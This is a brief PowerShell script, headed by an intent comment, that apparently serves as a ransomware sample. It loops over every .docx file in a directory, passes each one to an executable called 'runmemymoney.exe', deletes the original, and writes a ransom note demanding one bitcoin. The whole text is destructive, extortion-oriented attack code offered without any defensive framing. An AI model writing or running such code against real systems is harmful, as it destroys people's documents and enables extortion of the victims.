# INTENT: To encrypt all docx files in a directory.
foreach ($file in ((get-childitem | ? {$_.extension -eq ".docx"}).fullname)){
    .\runmemymoney.exe $file
    remove-item $file
}

echo "Your files have been encrypted. To get your files back, pay 1 bitcoin to DASIOJ4V9OJ09VJN." > YOURFILESAREENCRYPTED.TXT